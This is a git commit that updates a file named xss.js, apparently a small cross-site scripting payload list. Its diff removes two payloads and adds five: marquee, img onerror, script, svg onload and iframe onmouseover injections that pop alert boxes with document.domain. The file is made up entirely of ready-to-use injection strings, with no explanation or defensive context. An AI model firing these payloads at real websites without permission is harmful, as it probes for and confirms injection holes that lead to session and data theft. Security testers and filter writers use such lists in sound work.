e241e3bd69f6b3a0a49586aa0ea5d9ec72830dbe
ZS <88878147+zs-official@users.noreply.github.com>
2021-08-26 01:43:07 +0900

    Update xss.js

--- xss.js
+++ xss.js
@@ -1,2 +1,5 @@
-"><marquee+onstart='alert(document.domain)'>stored xss</marquee>
-"><img+src=x onerror=(a=alert,b=document.domain,a(b))>
+<marquee+onstart='alert(document.domain)'>stored xss</marquee>
+<img+src=x+onerror=(a=alert,b=document.domain,a(b))>
+<script>alert(1);</script>
+<svg onload=alert(1)>
+<iframe src=# onmouseover="alert(document.domain)"></iframe>
